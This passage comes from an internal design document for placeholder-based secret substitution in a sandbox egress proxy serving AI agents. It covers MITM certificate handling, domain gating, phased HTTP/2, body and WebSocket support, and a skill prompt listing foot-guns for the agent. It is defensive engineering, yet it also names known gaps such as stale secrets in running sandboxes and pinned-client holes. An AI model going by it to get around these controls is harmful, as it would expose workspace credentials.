  could `inotify`-watch a temp path and snapshot it before we move
  it. We avoid that with a single privileged `exec` call that pipes
  the JSON content via **stdin** (so the secret never appears in
  argv, in a process listing, or as a separately-owned file):

  ```
  install -o root -g root -m 600 \
      /dev/stdin /run/dust/.egress-secrets.json.<rand>.tmp \
    && mv /run/dust/.egress-secrets.json.<rand>.tmp \
          /run/dust/egress-secrets.json
  ```

  Run via `sandbox.exec(..., { user: "root", stdin: jsonContent })`.
  `install` creates the temp file as `root:root 0600` from byte zero
  (no mode-change race), the rename is atomic on the same tmpfs, and
  the agent UID never has read access at any point.

  We're explicitly **not** using `writeFile` to a `/tmp` path
  followed by a privileged copy - the inbound temp would be
  agent-readable for the duration. We're also explicitly **not**
  inlining the JSON in argv: even though our wrapper around E2B
  exec doesn't log command args (`traceSandboxOperation` only
  records `provider_id`/`workspace_id`), `ps` from inside the VM
  could observe the running command's argv, and E2B-side logging
  is out of our control. Stdin avoids both.

- **Live update / rotation: deferred to a later phase.** We
  knowingly do **not** ship file-watch / inotify / push-on-rotate in
  Phase 1. The Phase 1 propagation model is **rewrite-on-wake**:
  - On sandbox create or wake, `front` rewrites the secrets file
    from current admin state before any agent code runs.
  - On admin rotation/deletion of a secret while sandboxes are
    sleeping, the next wake picks up the new state.
  - On admin rotation/deletion while a sandbox is **active**, the
    Phase 1 model accepts that the running sandbox keeps using the
    old value until it sleeps and wakes again, OR until front
    explicitly kills+recreates it. The kill-and-recreate path
    exists for the "rotated/deleted secret must not linger" case
    but is operator-driven, not automatic.

  The race / serialization questions (admin rotation mid-wake,
  multi-instance front coordination, push-to-active-sandbox
  semantics) are **knowingly underspecified** at this stage. The
  later "live update" phase will address them - likely with
  inotify + atomic write + fail-closed parse + a coordination
  primitive for concurrent rotations - but we're not committing
  to a design now. Callout for design pass: the inotify/atomic-
  rename/fail-closed-parse pattern from earlier drafts is a good
  starting point but didn't fully cover wake races; we revisit
  with fresh eyes when we sequence that phase.

  Why this is acceptable for Phase 1: the only workspace consuming
  this on rollout is our internal one (see "Migration of existing
  rows" under Resolved decisions). Until external workspaces are
  on the secrets path, "rotation propagates on next wake" is a fine
  property to ship with.
- **Per-secret allowedDomains and the central egress allowlist are
  configured independently** (no save-time subset validation,
  no auto-add). Reason: the central egress allowlist is the union of
  default policy + workspace policy + sandbox-level dynamic policy
  (the agent can request additional sandbox-level entries via
  `add_egress_domain`). That union isn't fully knowable at the
  admin's secret-edit time. Instead, errors surface loudly at
  runtime - if a secret's allowedDomains include a domain the
  central proxy denies, the request drops at the proxy with a clear
  log entry. Admin debugs by adding the domain to the relevant
  policy layer.
- Trust coverage: Node, Python (Requests + HTTPX, separately), Bun,
  Deno, Go, Java (keytool at boot), Rust (native-tls), AWS SDKs, Git.
  Replace-style vs append-style env vars set per the matrix above.
  Rust webpki, cert-pinning, and mTLS clients documented as known
  holes that fail loudly.
- **Secret env-var naming**: secrets are exposed in the agent env
  under a dedicated prefix (e.g. `DSEC_*`; final prefix TBD), not
  under SDK-natural names. Agents that use SDKs which auto-discover
  env vars by exact name (e.g. OpenAI, Stripe) write a one-line
  mapping at the top of their script (`import os; os.environ["OPENAI_API_KEY"]
  = os.environ["DSEC_OPENAI_API_KEY"]`). The skill prompt
  documents this convention up front. The lexical signal in env
  preserves the agent's ability to enumerate which env vars are
  secrets at a glance, at the cost of one mapping line per SDK.
- Bash redactor (#25051) keeps applying to config vars (defense in
  depth for plaintext-in-env). Skill prompt updated to tell the agent
  secrets will substitute on the wire, distinguish them from config,
  and walk through the foot-guns.
- Admin UI: secrets get an `allowedDomains` column; the create flow
  asks for the class up front.
- Audit log: per-secret allowlist changes, class promotions, rotations,
  deletions.
- Estimate: ~2 engineer-weeks. Live-update push-to-active-sandbox
  lands in a later phase (see "Live update / rotation").

### Phase 2, MVP - HTTP/2

HTTP/2 is part of the MVP - we don't ship without it - but it's
sequenced after Phase 1 so we can land the substitution pipeline first
and validate it on h1 before adding frame-level complexity.

- HTTP/2 frame-level rewriter (h2 crate), HPACK-aware so the
  placeholder is recognized whether the header value is sent literally
  or after dynamic-table indexing.
- ALPN negotiation lets clients pick h2 again (Phase 1 forces h1).
- **URL substitution** (placeholder in request-line path/query for h1,
  `:path` pseudo-header for h2). Encoding rules: secrets used in URL
  position must validate as URL-safe at admin set time (alphanumeric
  + `-._~`), or a `urlSafe: true` flag on the secret indicates dsbx
  should percent-encode at substitution time. Decision pending in
  the Phase 2 design pass.
- Same trust/allowlist/placeholder model as Phase 1.

### Phase 3, body and WebSocket frame substitution (MVP)

Phase 3 closes the rest of MVP coverage by extending substitution to
HTTP message bodies and WebSocket frame payloads. Both gate on the
same per-secret `includeBody` opt-in (off by default).

- **HTTP body**: body scan + Content-Length recomputation, opt-in per
  secret via `includeBody`. Multipart form boundary handling. Chunked
  transfer encoding.
- **WebSocket frames** (post-101 substitution, opt-in via the same
  `includeBody` flag):
  - RFC 6455 frame parser (use `tungstenite` for framing). Unmask
    client→server payload, scan for the placeholder, substitute,
    recompute payload length, re-emit (re-masking is allowed by the
    spec; pick a fresh mask).
  - Fragmented messages: bounded-buffer reassembly with a per-message
    cap (e.g. 1 MB) so a placeholder straddling frame boundaries is
    found. Frames over the cap are spliced unchanged.
  - **Strip `permessage-deflate`** from the upgrade request before
    forwarding. Server falls back to uncompressed frames; rewriter
    operates on plaintext payloads. Avoids streaming
    decompress/recompress with shared sliding-window state. Bandwidth
    cost on chatty APIs is acceptable for MVP; revisit if a workspace
    needs deflate support.
  - Server→client direction is byte-spliced (no substitution; the real
    secret never travels in that direction).
  - Same allowlist gate as headers: substitution only happens when the
    upgrade was negotiated against an SNI/Host that's in the secret's
    `allowedDomains`. Unknown placeholders inside frames on a
    MITM-scoped connection drop the connection.

Without Phase 3, websocket APIs that authenticate via a first-frame
JSON payload (Discord gateway, some custom backends) can't be used
with secrets. With Phase 3 they can, after the admin sets
`includeBody` on the secret.

### Phase 4+, tail cases

- **Live update / push-to-active-sandbox**: file-watch (inotify) +
  atomic write + fail-closed parse + serialization for concurrent
  rotations and wake races. Phase 1 ships rewrite-on-wake only; this
  phase closes the gap where a rotation/deletion needs to land on a
  currently-running sandbox without waiting for sleep+wake.
- **Richer auth formats** (HMAC, SigV4): per-secret `format` field
  (`hmac-sha256 | sigv4 | ...`) so dsbx can apply the format-specific
  transformation at substitution time. Covers HMAC webhook signing
  and AWS SigV4. (Basic auth is handled in Phase 1 directly because
  it's just a base64 wrapper around a literal credential string.)
- **WebSocket `permessage-deflate`** support (re-add the extension,
  streaming decompress/recompress). Only if a workspace needs it.
- Plain HTTP on non-standard ports (protocol detection from peek bytes
  rather than port keying).
- Per-protocol rewriters for non-HTTP TLS (Postgres, MySQL, Redis), opt
  in by domain.

## Resolved decisions

- **HTTP/2**: part of the MVP (we don't GA without it) but sequenced as
  Phase 2 after the h1 pipeline lands and is validated.
- **WebSockets**: full support is part of the MVP. Phase 1 covers
  upgrade-request header substitution (the common case: Anthropic
  streaming, OpenAI Realtime, anything that authenticates in the
  upgrade) and byte-splices post-101 frames so MITM-scoped WS
  connections don't break. Phase 3 adds in-frame substitution for
  APIs that authenticate via a first-frame payload (Discord-style),
  using the same `includeBody` opt-in as body substitution.
  `permessage-deflate` is **stripped at upgrade time** in Phase 3 to
  keep the frame rewriter on plaintext; full deflate support is a
  Phase 4+ tail case.
- **Body substitution**: not in Phase 1. Phase 1 = headers only;
  URL = Phase 2; body = Phase 3. OAuth
  `client_secret`, webhook signing, and multipart forms come in Phase 3
  with an opt-in `includeBody` flag. Advertise the limit loudly in the
  admin UI when admins create a secret.
- **Bash redactor (#25051)**: kept, but only applies to config vars (the
  plaintext-in-env class). Secrets don't need it: the placeholder is
  what's in env, not the real value.
- **Trust coverage**: full mainstream coverage in Phase 1 (Node, Python,
  Bun, Deno, Go, Java, Rust native-tls, AWS SDKs, Git). Rust
  `rustls-webpki` and cert-pinning clients documented as known holes
  that fail loudly.
- **Placeholder identity**: workspace-scoped, not sandbox-scoped. A
  given secret has the same placeholder in every sandbox of the
  workspace. Within-workspace replay across sandboxes substitutes
  correctly, which is fine: the secret is a workspace-level authority
  and any sandbox of that workspace is already authorized to use it.
  Cross-workspace replay is impossible (different random nonce).
- **Placeholder generator**: per-secret 16-byte random nonce stored on
  the row. Unforgeable by construction. Generated once at create time
  and stable for the life of the row (see "Placeholder nonce is stable
  for the life of the secret row" below).
- **Security invariant**: the real secret value is never forwarded to a
  destination outside the matching secret's `allowedDomains`. The
  placeholder itself is an opaque random nonce - whether it leaks to
  non-MITM destinations is not security-sensitive. On the MITM-scoped
  surface where dsbx can act, recognized placeholders going to a
  non-allowed destination drop the connection (loud failure where
  possible). Earlier doc text claiming "literal placeholder is never
  forwarded" was an overpromise and has been removed.
- **Port 80 (plaintext HTTP)**: drop on placeholder, never substitute.
  Substituting on plaintext would put the real secret on the open
  internet between the central egress proxy and the upstream.
- **Non-HTTP over MITM-scoped TLS** (e.g. Postgres TLS on a domain in
  the allowlist union): pass through unchanged. dsbx doesn't substitute
  (no HTTP framing to scan) and doesn't drop. Consistent with the
  weakened "placeholder leak doesn't matter" framing; matches the
  shipping cost we want for Phase 1.
- **Raw TCP / non-80/443 ports**: not addressed by this design. The
  central egress proxy already denies non-HTTP/non-HTTPS connections.
  If raw-TCP egress is ever needed, it's a separate design.
- **Wildcard support in `allowedDomains`**: yes, leading `*.`
  (e.g. `*.googleapis.com`). Same shape as workspace egress policy.
  Wildcard secrets broaden MITM scope to whatever resolves under the
  pattern.
- **MITM scope**: only the union of all configured secrets'
  `allowedDomains`. Other HTTPS traffic stays on the existing
  TCP-splice path. Cert-pinned and mTLS clients to non-secret domains
  are unaffected.
- **Substitution gate**: SNI + HTTP `Host:` + h2 `:authority:` must
  all agree on a domain in the matching secret's `allowedDomains`.
  Closes the SNI/Host confused-deputy edge case.
- **CA lifecycle**: per-sandbox-VM, persisted on tmpfs at
  `/run/dust/egress-ca.{pem,key}`. Survives dsbx restart. Cert is
  root-owned 0644 (boot script needs to install it into the system
  store); key is root-owned 0600. tmpfs is RAM-backed, never hits
  durable storage. Combined with the no-escalation invariant, the agent
  UID has no path to the key.
- **Live update / rotation**: **deferred** out of Phase 1. Phase 1
  ships rewrite-on-wake only: front rewrites
  `/run/dust/egress-secrets.json` at sandbox create and on the wake
  path before any agent code runs, so rotations/deletions land on
  the next wake. Push-to-active-sandbox via file-watch (inotify +
  atomic write + fail-closed parse + race serialization) lands in
  a later phase; the design for it is **knowingly underspecified**
  right now. Acceptable because the rollout is internal-only, so
  "rotation propagates on next wake" is fine for now.
- **Placeholder nonce is stable for the life of the secret row.**
  Generated once at create time, kept across value rotations and
  allowedDomains edits. Only deletion ends it. After a rotation,
  the next wake of any sandbox holding the placeholder picks up the
  new value via the rewritten secrets file - no env refresh needed,
  same placeholder substitutes to the new value.
- **Secrets-file write mechanism**: `front` writes
  `/run/dust/egress-secrets.json` via a single privileged exec
  with the JSON piped on **stdin**, calling `install -o root -g root
  -m 600 /dev/stdin <tmp>` and atomically renaming onto the target.
  No agent-readable temp file, no secret in argv, no logging
  exposure. See "How front writes the file" under Phase 1 spec.
- **URL substitution**: deferred from Phase 1 to Phase 2.
  Phase 1 substitutes in headers only; dsbx drops on observed
  placeholder in the request line (loud failure). URL-context
  encoding rules will be specified in Phase 2.
- **Migration of existing rows**: existing `WorkspaceSandboxEnvVar` rows
  default to config vars on rollout. Promotion to secrets is fully
  manual (no auto-flagging), since the only workspace where this rolls
  out first is our internal one. **Already-running sandboxes at the
  moment of promotion are explicitly not covered**: env vars are
  injected at sandbox create only (`provider.create`), not per-exec,
  so a sandbox that exists at promotion time keeps the plaintext
  `DST_*` value in its process env until it sleeps and wakes (or is
  killed/recreated). We accept that gap because rollout is
  internal-only and we don't intend to retroactively secure existing
  sandboxes. External-workspace rollout would need a kill-on-promote
  pass; that decision is deferred until external rollout is on the
  table.
- **Skill prompt**: explicit + concise. Names the substitution
  mechanism so the agent can use secrets correctly and explain failure
  modes to users. Two prefixes distinguish config vars (`DST_*`) from
  secrets (different prefix, TBD). Hard "DO NOT" list at the top of
  the prompt for the known foot-guns; per-secret inline notes
  deferred. See "Skill prompt" below for details.
- **Secret env-var naming**: secrets are exposed under the dedicated
  prefix only (e.g. `DSEC_*`), not under SDK-natural names. Agents map
  to SDK-expected names with a one-line aliasing snippet at the top of
  their script. Trade: the lexical signal in env (the agent can
  enumerate secrets via prefix) wins over the no-code-changes goal,
  which was overstated for SDKs that auto-discover by exact name.
- **`allowedDomains` vs central egress allowlist**: configured
  independently. No save-time subset validation, no auto-add. Reason:
  the central allowlist is the union of default + workspace +
  sandbox-level dynamic policy (the agent can request
  per-sandbox additions via `add_egress_domain`), so the relevant
  union isn't fully known at admin secret-edit time. Errors surface
  at runtime via the proxy deny path with clear log entries.
- **Secret value validation**: admin UI rejects CR / LF / NUL / other
  ASCII control chars and enforces a max length (~8KB). dsbx
  fail-closed at substitution time as defense in depth. Closes the
  CRLF-injection primitive at both ends.
- **HTTP/1.1 rewriter**: full message loop, not Phase 0's first-headers-
  prefix-only shape. Per-request parsing, per-request Host validation,
  pipelining handled, fail-closed on malformed/oversized/truncated
  headers.
- **HTTP Basic auth**: handled in Phase 1 as a one-off base64 case in
  the header rewriter. dsbx decodes `Authorization: Basic <token>`,
  scans for the placeholder, substitutes, re-encodes. Cheap because
  Basic is just base64-of-string; the placeholder alphabet round-trips
  through base64 cleanly. Does not generalize to HMAC/SigV4 (those
  need request signing, structurally different, deferred to Phase 4+).
- **mTLS on MITM-scoped domains**: explicitly unsupported. dsbx opens
  fresh outbound TLS without a client cert; client-auth flows to a
  domain in the allowlist union fail at the upstream's handshake.
  mTLS to non-MITM domains (TCP-spliced) is unaffected.

### Skill prompt

Goal: a concise, explicit prompt that gives the agent enough mental
model to (a) use secrets correctly, (b) recognize and explain failure
modes to users instead of flailing.

- **Explicit, not opaque.** The prompt names the substitution mechanism.
  The threat model is "agent leaks the secret to the world", not
  "agent learns how the system works". Knowing substitution exists
  helps the agent stop trying to fix what looks like a wrong-looking
  value, and helps it explain to users when something fails (e.g. a
  secret used in a config file context, a cert-pinned client, or a
  non-allowlisted destination).
- **Two env-var prefixes** distinguish the classes lexically (no per-row
  prompt bloat):
  - Config vars: `DST_*` (today's prefix, plaintext, offline use ok).
  - Secrets: a different prefix, TBD (e.g. `DSEC_*`). Substituted on
    the wire only, HTTPS only, scoped to `allowedDomains`.
  A future `dsbx list-secrets` command may surface available secret
  names dynamically; for now the agent discovers them via env.
- **SDK aliasing**. SDKs that auto-discover env vars by exact name
  (OpenAI looks for `OPENAI_API_KEY`, Stripe for `STRIPE_SECRET_KEY`,
  etc.) will not find a `DSEC_*`-prefixed secret. The skill prompt
  instructs the agent to add a one-line alias at the top of its
  script when using such an SDK:
  ```python
  import os
  os.environ["OPENAI_API_KEY"] = os.environ["DSEC_OPENAI_API_KEY"]
  # then use the SDK normally
  ```
  This is the deliberate trade for keeping the lexical signal in env.
  The aliasing line only assigns the placeholder to a second name in
  the agent's process - the substitution still happens on the wire
  in dsbx.
- **Hard "DO NOT" list at the top** of the skill prompt for the known
  foot-guns:
  - Do not pass `verify=`, `ca:`, custom `RootCAs`, `tls.Config`, or a
    custom trust manager. Breaks TLS to substituted domains.
  - Do not transform a secret value before sending (base64, urlencode,
    split across headers, write to a file then re-read). Any
    transformation breaks substitution and the upstream sees garbage.
  - Do not attempt to extract or print the real value of a secret. The
    placeholder is what's in env on purpose.
  - Use a secret only with its declared allowed domain. Cross-domain
    use will not substitute and the request fails loudly.
  - For Rust HTTP clients, use `reqwest`'s default features (which
    select `native-tls` and read the system trust store) or
    `rustls-tls-native-roots`. Do **not** pick `rustls-tls`
    (webpki-roots), it ships a hardcoded Mozilla bundle and won't
    trust the per-sandbox CA. The failure is a clean TLS error, but
    you'll spin trying to debug it - just switch features.
- **Per-secret inline notes** in the prompt are deferred. Start with the
  hard list and the prefix convention; revisit if specific failure
  modes turn out to need stronger steering.
